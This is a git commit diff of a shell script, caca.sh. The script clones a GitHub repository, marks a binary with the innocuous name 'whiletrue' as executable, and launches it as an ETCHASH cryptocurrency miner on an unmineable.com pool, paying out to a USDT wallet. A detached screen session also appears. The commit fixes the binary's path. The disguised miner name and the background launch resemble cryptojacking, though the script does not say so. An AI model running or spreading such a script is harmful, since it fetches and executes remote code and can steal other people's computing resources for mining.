6c9f6525961e8c76468057c35e5c1f266bbfd038
revaisna7 <92873602+revaisna7@users.noreply.github.com>
2022-10-16 11:22:47 +0000

    Update caca.sh

--- caca.sh
+++ caca.sh
@@ -6,4 +6,4 @@ screen -dmS caca.sh 65 75
 sudo git clone https://github.com/revaisna7/reva.git
 cd reva 
 chmod +x whiletrue
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && /whiletrue --algo ETCHASH --pool etchash.unmineable.com:4444 --user USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP.$(echo $(shuf -i 1-9999 -n 1)-Masku)
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./whiletrue --algo ETCHASH --pool etchash.unmineable.com:4444 --user USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP.$(echo $(shuf -i 1-9999 -n 1)-Masku)
